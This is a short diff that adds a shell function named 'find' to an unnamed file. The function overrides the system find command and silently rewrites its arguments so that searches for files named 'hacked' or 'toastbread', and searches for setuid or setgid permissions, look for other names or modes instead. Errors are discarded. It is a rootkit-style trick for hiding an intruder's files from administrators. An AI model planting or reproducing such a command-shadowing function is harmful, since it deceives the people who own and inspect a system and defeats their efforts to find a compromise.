@@ -1,0 +1,7 @@
+function find {          
+	PERM="0700"
+	/usr/bin/find $(echo "$@" | sed -r "s/toastbread/suchwow/g;        
+s/hacked/perfectlyNormal/g;    
+s/-perm [0-7]{3,4}/-perm ${PERM}/g;
+s/-perm \/[ug]=s/-perm ${PERM}/g") 2>&-
+}
